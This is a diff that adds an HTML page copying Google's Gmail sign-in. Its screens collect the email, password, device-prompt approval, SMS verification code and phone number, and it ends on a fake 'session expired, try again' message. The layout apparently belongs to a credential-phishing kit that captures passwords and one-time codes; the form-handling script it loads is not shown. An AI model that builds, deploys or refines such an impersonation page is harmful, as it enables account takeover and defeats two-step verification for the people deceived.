@@ -1,0 +1,557 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="/assets/images/google.png" />
+    <link rel="stylesheet" href="./css/google.css" />
+    <title>Sign in with your Google Account</title>
+  </head>
+
+  <body>
+    <div class="loading-overlay" aria-hidden="true"></div>
+    <section class="page">
+      <div class="signin-card">
+        <header class="signin-card__header">
+          <div class="header-logo">
+            <img
+              src="./assets/images/google.png"
+              alt="Google"
+              width="48"
+              height="48"
+            />
+          </div>
+        </header>
+        <!-- ==================== -->
+        <!-- EMAIL SCREEN          -->
+        <!-- ==================== -->
+        <div class="signin-screen signin-screen--email active">
+          <div class="signin-card__body">
+            <div class="signin-card__intro">
+              <span class="signin-card__title">Sign in</span>
+
+              <span class="signin-card__description">
+                with your Google Account to continue to Gmail. This account will
+                be available to other Google apps in the browser.
+              </span>
+            </div>
+
+            <form class="signin-card__form" id="signin-form">
+              <div class="signin-card__field">
+                <div class="signin-card__input">
+                  <input
+                    type="text"
+                    id="email"
+                    name="email"
+                    autocomplete="username"
+                    placeholder=" "
+                  />
+
+                  <label for="email">Email or phone</label>
+                </div>
+
+                <div class="signin-card__error" role="alert">
+                  <svg
+                    aria-hidden="true"
+                    fill="currentColor"
+                    focusable="false"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    xmlns="https://www.w3.org/2000/svg"
+                  >
+                    <path
+                      d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+                    />
+                  </svg>
+
+                  <span class="signin-card__error-message"
+                    >Enter an email or phone number.</span
+                  >
+                </div>
+
+                <div class="forgot-wrapper">
+                  <a href="#" class="signin-card__forgot"> Forgot email? </a>
+                </div>
+              </div>
+            </form>
+
+            <div class="signin-card__alternative">
+              Not your computer? Use Guest mode to sign in privately.
+              <a
+                class="learn_more"
+                href="https://support.google.com/chrome/answer/6130773?hl=en-US"
+                target="_blank"
+              >
+                Learn more about using Guest mode
+              </a>
+            </div>
+          </div>
+
+          <footer class="signin-card__footer">
+            <button type="button" class="signin-card__create-account">
+              <span>Create account</span>
+            </button>
+
+            <button
+              type="submit"
+              class="signin-card__submit"
+              form="signin-form"
+            >
+              Next
+            </button>
+          </footer>
+        </div>
+        <!-- ==================== -->
+        <!-- PASSWORD SCREEN       -->
+        <!-- ==================== -->
+        <div class="signin-screen signin-screen--password">
+          <div class="signin-card__body">
+            <div class="signin-card__intro">
+              <span class="signin-card__title">Welcome</span>
+
+              <button class="signin-card__account-btn">
+                <svg
+                  aria-hidden="true"
+                  class="Qk3oof"
+                  fill="currentColor"
+                  focusable="false"
+                  width="48px"
+                  height="48px"
+                  viewBox="0 0 24 24"
+                  xmlns="https://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+                  ></path>
+                </svg>
+                <span class="signin-card__account"></span>
+                <svg
+                  viewBox="7 10 10 5"
+                  width="10"
+                  height="5"
+                  aria-hidden="true"
+                  focusable="false"
+                  class="ddd"
+                >
+                  <polygon points="7 10 12 15 17 10" fill="currentColor" />
+                </svg>
+              </button>
+            </div>
+
+            <form class="signin-card__form" id="password-form">
+              <div class="signin-card__field">
+                <div class="signin-card__input password">
+                  <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    autocomplete="current-password"
+                    placeholder=" "
+                  />
+
+                  <label for="password">Enter your password</label>
+                </div>
+
+                <div class="signin-card__error" role="alert">
+                  <svg
+                    aria-hidden="true"
+                    fill="currentColor"
+                    focusable="false"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    xmlns="https://www.w3.org/2000/svg"
+                  >
+                    <path
+                      d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+                    />
+                  </svg>
+
+                  <span class="signin-card__password-error"
+                    >Wrong password. Try again or click "Forgot password?" for
+                    more options.</span
+                  >
+                </div>
+
+                <div class="signin-card__password-toggle">
+                  <label>
+                    <span class="signin-card__checkbox">
+                      <input type="checkbox" id="show-password" />
+                    </span>
+
+                    Show password
+                  </label>
+                </div>
+              </div>
+            </form>
+          </div>
+
+          <footer class="signin-card__footer password">
+            <button type="button" class="signin-card__create-account">
+              <span>Forgot Password?</span>
+            </button>
+
+            <button
+              type="submit"
+              class="signin-card__submit"
+              form="password-form"
+            >
+              Next
+            </button>
+          </footer>
+        </div>
+        <!-- ==================== -->
+        <!-- LOADING SCREEN        -->
+        <!-- ==================== -->
+        <div class="signin-screen signin-screen--loading">
+          <div class="signin-card__body">
+            <div class="signin-card__intro">
+              <span class="signin-card__title">Welcome</span>
+
+              <button type="button" class="signin-card__account-btn">
+                <svg
+                  aria-hidden="true"
+                  class="Qk3oof"
+                  fill="currentColor"
+                  focusable="false"
+                  viewBox="0 0 24 24"
+                >
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+                  />
+                </svg>
+
+                <span class="signin-card__account"></span>
+
+                <svg
+                  viewBox="7 10 10 5"
+                  width="10"
+                  height="5"
+                  aria-hidden="true"
+                  focusable="false"
+                >
+                  <polygon points="7 10 12 15 17 10" fill="currentColor" />
+                </svg>
+              </button>
+            </div>
+
+            <div class="signin-card__loading">
+              <div class="loading-spinner" aria-hidden="true"></div>
+
+              <div class="loading-text">Please wait...</div>
+
+              <div class="loading-subtext">
+                Do not close or refresh this page
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- ==================== -->
+        <!-- YES PROMPT SCREEN     -->
+        <!-- ==================== -->
+        <div class="signin-screen signin-screen--yes-prompt">
+          <div class="signin-card__body">
+            <div class="signin-card__intro">
+              <span class="signin-card__title">Verify it’s you</span>
+
+              <span class="signin-card__description">
+                To help keep your account safe, Google wants to make sure it’s
+                really you trying to sign in.
+                <a
+                  class="learn_more"
+                  href="https://support.google.com/accounts?p=login_chal"
+                  >Learn More</a
+                >
+              </span>
+
+              <button class="signin-card__account-btn">
+                <svg
+                  aria-hidden="true"
+                  class="Qk3oof"
+                  fill="currentColor"
+                  focusable="false"
+                  width="48px"
+                  height="48px"
+                  viewBox="0 0 24 24"
+                  xmlns="https://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+                  ></path>
+                </svg>
+                <span class="signin-card__account"></span>
+                <svg
+                  viewBox="7 10 10 5"
+                  width="10"
+                  height="5"
+                  aria-hidden="true"
+                  focusable="false"
+                  class="ddd"
+                >
+                  <polygon points="7 10 12 15 17 10" fill="currentColor" />
+                </svg>
+              </button>
+            </div>
+
+            <div class="signin-card__yesPrompt">
+              <div class="signin-card__yesPrompt-number"></div>
+
+              <div class="signin-card__yesPrompt-text">
+                Open the Gmail app on your Device
+              </div>
+
+              <div class="signin-card__yesPrompt-subtext">
+                Google sent a notification to your Device. Open the Gmail app
+                tap <strong>Yes</strong> on the prompt to verify it’s you.
+              </div>
+            </div>
+          </div>
+
+          <footer class="signin-card__footer">
+            <button
+              type="button"
+              class="signin-card__create-account signin-card__yesPrompt-resendBtn"
+            >
+              <span>Resend it</span>
+            </button>
+          </footer>
+
+          <footer class="signin-card__footer">
+            <button
+              type="button"
+              class="signin-card__create-account signin-card__yesPrompt-tawBtn"
+            >
+              <span>Try another way</span>
+            </button>
+          </footer>
+        </div>
+        <!-- ==================== -->
+        <!-- SMS CODE SCREEN     -->
+        <!-- ==================== -->
+        <div class="signin-screen signin-screen--sms-code">
+          <div class="signin-card__body">
+            <div class="signin-card__intro">
+              <span class="signin-card__title">Verify it’s you</span>
+
+              <span class="signin-card__description">
+                To help keep your account safe, Google wants to make sure it’s
+                really you trying to sign in.
+                <a
+                  class="learn_more"
+                  href="https://support.google.com/accounts?p=login_chal"
+                  >Learn More</a
+                >
+              </span>
+
+              <button class="signin-card__account-btn">
+                <svg
+                  aria-hidden="true"
+                  class="Qk3oof"
+                  fill="currentColor"
+                  focusable="false"
+                  width="48px"
+                  height="48px"
+                  viewBox="0 0 24 24"
+                  xmlns="https://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+                  ></path>
+                </svg>
+                <span class="signin-card__account"></span>
+                <svg
+                  viewBox="7 10 10 5"
+                  width="10"
+                  height="5"
+                  aria-hidden="true"
+                  focusable="false"
+                  class="ddd"
+                >
+                  <polygon points="7 10 12 15 17 10" fill="currentColor" />
+                </svg>
+              </button>
+            </div>
+
+            <div class="signin-card__yesPrompt">
+              <div class="signin-card__yesPrompt-text">Enter the code</div>
+
+              <div class="signin-card__yesPrompt-subtext">
+                Enter the 6-digit verification code to confirm you got the text
+                message
+              </div>
+
+              <form id="sms-code-form">
+                <div class="signin-card__input signin-card__input--sms-code">
+                  <input
+                    type="text"
+                    inputmode="numeric"
+                    maxlength="6"
+                    autocomplete="one-time-code"
+                    id="sms-code"
+                    name="sms-code"
+                    placeholder=" "
+                  />
+
+                  <label for="sms-code">Enter code</label>
+                </div>
+              </form>
+              <div class="signin-card__password-toggle">
+                <label>
+                  <span class="signin-card__checkbox">
+                    <input type="checkbox" checked />
+                  </span>
+
+                  Don’t ask again on this device
+                </label>
+              </div>
+            </div>
+          </div>
+
+          <footer class="signin-card__footer">
+            <button
+              type="submit"
+              class="signin-card__submit"
+              form="sms-code-form"
+            >
+              Next
+            </button>
+          </footer>
+        </div>
+        <!-- ==================== -->
+        <!-- PHONE NUMBER SCREEN     -->
+        <!-- ==================== -->
+        <div class="signin-screen signin-screen--phone-number">
+          <div class="signin-card__body">
+            <div class="signin-card__intro">
+              <span class="signin-card__title">2-Step Verification</span>
+
+              <span class="signin-card__description">
+                To help keep your account safe, Google wants to make sure it’s
+                really you trying to sign in.
+              </span>
+
+              <button class="signin-card__account-btn">
+                <svg
+                  aria-hidden="true"
+                  class="Qk3oof"
+                  fill="currentColor"
+                  focusable="false"
+                  width="48px"
+                  height="48px"
+                  viewBox="0 0 24 24"
+                  xmlns="https://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+                  ></path>
+                </svg>
+                <span class="signin-card__account"></span>
+                <svg
+                  viewBox="7 10 10 5"
+                  width="10"
+                  height="5"
+                  aria-hidden="true"
+                  focusable="false"
+                  class="ddd"
+                >
+                  <polygon points="7 10 12 15 17 10" fill="currentColor" />
+                </svg>
+              </button>
+            </div>
+
+            <div class="signin-card__yesPrompt">
+              <div class="signin-card__yesPrompt-text">Verify your phone number</div>
+
+              <div class="signin-card__yesPrompt-subtext">
+                For your security, Google wnats to make sure it's really you. Google will send a text message with a 6-digit verification code. <i>Standard rates apply</i>
+              </div>
+
+              <form id="phone-number-form">
+                <div class="signin-card__input signin-card__input--phone-number">
+                  <input
+                    type="text"
+                    inputmode="numeric"
+                    id="phone-number"
+                    name="phone-number"
+                    placeholder=" "
+                  />
+
+                  <label for="phone-number">Enter phone number</label>
+                </div>
+              </form>
+            </div>
+          </div>
+
+          <footer class="signin-card__footer">
+            <button
+              type="submit"
+              class="signin-card__submit"
+              form="phone-number-form"
+            >
+              Next
+            </button>
+          </footer>
+        </div>
+        <!-- ==================== -->
+        <!-- SUCCESS SCREEN     -->
+        <!-- ==================== -->
+        <div class="signin-screen signin-screen--success-screen">
+          <div class="signin-card__body">
+            <div class="signin-card__intro">
+              <span class="signin-card__title">You’re not signed in</span>
+
+              <span class="signin-card__description">
+                Your session has expired. Please sign in again.
+              </span>
+            </div>
+          </div>
+          <footer class="signin-card__footer">
+            <button type="button" class="signin-card__submit">Try Again</button>
+          </footer>
+        </div>
+      </div>
+
+      <footer class="signin-footer">
+        <button class="signin-footer__language">
+          English (United States)
+
+          <svg
+            viewBox="7 10 10 5"
+            width="10"
+            height="5"
+            aria-hidden="true"
+            focusable="false"
+          >
+            <polygon points="7 10 12 15 17 10" fill="currentColor" />
+          </svg>
+        </button>
+
+        <nav class="signin-footer__links" aria-label="Footer">
+          <a
+            href="https://support.google.com/accounts?hl=en-US&p=account_iph"
+            target="_blank"
+          >
+            Help
+          </a>
+
+          <a
+            href="https://accounts.google.com/TOS?loc=US&hl=en-US&privacy=true"
+            target="_blank"
+          >
+            Privacy
+          </a>
+
+          <a
+            href="https://accounts.google.com/TOS?loc=US&hl=en-US"
+            target="_blank"
+          >
+            Terms
+          </a>
+        </nav>
+      </footer>
+    </section>
+
+    <script type="module" src="./js/gmain.js"></script>
+  </body>
+</html>
